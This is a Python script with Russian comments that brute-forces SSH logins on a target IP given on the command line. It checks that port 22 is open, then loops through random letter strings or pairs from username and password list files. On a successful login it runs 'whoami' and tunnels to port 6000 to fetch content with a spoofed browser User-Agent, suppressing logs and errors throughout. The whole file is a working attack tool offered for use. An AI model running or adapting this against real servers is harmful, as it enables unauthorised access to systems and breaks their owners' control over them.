import paramiko
import sys
import random
import string
import socket
import logging
from sshtunnel import SSHTunnelForwarder
import requests

# Отключение логирования paramiko
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def generate_random_string(length):
    """Генерирует случайную строку из букв длиной length"""
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

def is_port_open(ip, port):
    """Проверяет, открыт ли указанный порт на заданном IP"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)  # Установите таймаут на 1 секунду
    try:
        sock.connect((ip, port))
        return True
    except (socket.timeout, ConnectionRefusedError):
        return False
    finally:
        sock.close()

def ssh_connect(ip, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password)
        print(f'Successfully connected to {ip}:{port} with {username}:{password}')

        # Выполнение команды
        stdin, stdout, stderr = client.exec_command('whoami')
        print('Response:', stdout.read().decode())
        
        # Туннелирование
        with SSHTunnelForwarder(
                (ip, port),
                ssh_password=password,
                ssh_username=username,
                local_bind_address=('127.0.0.1', 6000),
                remote_bind_address=('localhost', 6000)  # или другой хост
        ) as server:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0'}
            r = requests.get('http://127.0.0.1:6000', headers=headers).content
            print(r)

    except Exception as e:
        # Ошибки будут подавлены в консоли
        pass
    finally:
        client.close()

if __name__ == "__main__":
    chose = input("Вы хотите, чтобы имя пользователя и пароль перебирались случайным образом? (yes/no): ").strip().lower()
    if chose not in ['yes', 'no']:
        print("Неверный ввод. Пожалуйста, введите 'yes' или 'no'.")
        exit(1)

    if len(sys.argv) < 2:
        print("Не указан IP-адрес для подключения.")
        exit(1)

    target_ip = sys.argv[1]
    port = 22  # Порт для подключения по умолчанию

    # # Проверка, открыт ли порт 22
    if not is_port_open(target_ip, port):
        print(f"Порт {port} на {target_ip} закрыт. Попытки подключения по этому порту не будут выполнены.")
        exit(1)

    if chose == 'yes':
        # Перебор случайных комбинаций
        while True:
            username = generate_random_string(random.randint(1, 10))
            password = generate_random_string(random.randint(1, 10))
            print(f"Пробуем подключиться к {target_ip}:{port} по SSH с {username}:{password}...")
            ssh_connect(target_ip, port, username, password)
    else:
        # Чтение имен пользователей из файла
        try:
            with open('ScanPort/usernames.txt', 'r') as f:
                usernames = [line.strip() for line in f]
        except FileNotFoundError:
            print("Файл с именами пользователей не найден.")
            exit(1)

        # Чтение паролей из файла
        try:
            with open('ScanPort/passwords.txt', 'r') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError:
            print("Файл с паролями не найден.")
            exit(1)

        if usernames and passwords:
            for username in usernames:
                for password in passwords:
                    print(f"Пробуем подключиться к {target_ip}:{port} по SSH с {username}:{password}...")
                    ssh_connect(target_ip, port, username, password)
        else:
            print("Нет имен пользователей или паролей.")
